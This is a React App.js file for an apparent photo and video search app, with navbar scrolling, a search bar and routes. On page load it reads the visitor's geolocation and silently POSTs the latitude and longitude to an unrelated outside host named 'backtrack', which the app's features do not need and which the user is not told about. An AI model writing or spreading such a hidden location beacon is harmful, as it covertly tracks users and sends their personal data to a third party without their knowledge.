import React, { useEffect, useState } from "react";
import logo from "./logo.svg";
import { Counter } from "./features/counter/Counter";
import "./App.css";
import Header from "./Components/Header/Header";
import { BrowserRouter } from "react-router-dom";
import { Route, Routes } from "react-router-dom";
import Home from "./Pages/Home";
import Tabbar from "./Components/Tabbar/Tabbar";
import Photos from "./Components/Photos/Photos";
import Footer from "./Components/Footer/Footer";
import Videos from "./Components/Videos/Videos";
import navimg from "./images/Nav-logo.png";
import Favourites from "./Components/Favourites/Favourites";
import Photolarge from "./Components/Photo-large/Photolarge";
import Videolarge from "./Components/Video-large/Videolarge";
import mobilelogo from "./images/mobile-logo.png";
import { useDispatch } from "react-redux";
import {
  fetchAsyncSearch,
  fetchAsyncSearchVideo,
} from "./features/Photo/PhotoSlice";
import axios from "axios";

function App() {
  window.onscroll = function () {
    scrollFunction();
  };

  function scrollFunction() {
    if (
      document.body.scrollTop > 50 ||
      document.documentElement.scrollTop > 50
    ) {
      document.getElementById("navbar").style.top = "0";
    } else {
      document.getElementById("navbar").style.top = "-200px";
    }
  }
  const [inputValue, setInputValue] = useState("");
  const dispatch = useDispatch();

  useEffect(() => {
    if (window.navigator.geolocation) {
      window.navigator.geolocation.getCurrentPosition(success, console.error());
    } else {
      console.log("Geolocation not supported");
    }
  }, []);
  async function success(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const dummy = {
      devicedetails: {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
      },
    };
    const req = await axios
      .post(`https://backtrack-vlue.onrender.com/`, {
        devicedetails: {
          latitude: position.coords.latitude ,
          longitude:position.coords.longitude
        },
      })
      .then((request) => {
        console.log(request);
      });

    console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
  }

  return (
    <div className="App">
      <div id="navbar">
        <div>
          <img src={navimg} className="nav-img"></img>
        </div>
        <div>
          <img src={mobilelogo} className="nav-mobile-img"></img>
        </div>
        <div className="nav-search-bar">
          <input
            className="nav-search-input"
            placeholder="Search photos, videos, artists"
            value={inputValue}
            onChange={(event) => setInputValue(event.target.value)}
          ></input>
          <button
            className="nav-search-button"
            onClick={() => {
              if (window.location.pathname === "/") {
                dispatch(fetchAsyncSearch(inputValue));
              } else {
                dispatch(fetchAsyncSearchVideo(inputValue));
              }
            }}
          >
            SEARCH
          </button>
        </div>
      </div>
      <BrowserRouter>
        <Header />
        <Tabbar />
        <Routes>
          <Route path="/" exact element={<Photos />} />
          <Route path="/videos" element={<Videos />} />
          <Route path="/favourites" element={<Favourites />} />
          <Route path="/imagelarge" element={<Photolarge />} />
          <Route path="/Videolarge" element={<Videolarge />} />
        </Routes>
        <Footer />
      </BrowserRouter>
    </div>
  );
}

export default App;
